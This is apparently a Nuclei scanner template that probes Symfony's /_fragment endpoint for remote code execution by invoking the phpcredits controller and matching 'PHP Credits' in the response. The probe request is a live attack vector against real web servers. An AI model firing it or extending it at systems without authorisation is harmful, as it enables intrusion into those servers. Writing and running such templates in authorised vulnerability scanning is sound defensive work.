id: rce-symfony
info:
  author: ELSFA7110
  name: symfony rce
  reference: '- https://www.acunetix.com/vulnerabilities/web/symfony-rce-via-weak-predictable-app_secret

    - https://www.ambionics.io/blog/symfony-secret-fragment

    '
  severity: high
  tags: rce
requests:
- matchers:
  - part: body
    type: word
    words:
    - PHP Credits
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/_fragment?_path=_controller=phpcredits&flag=-1'
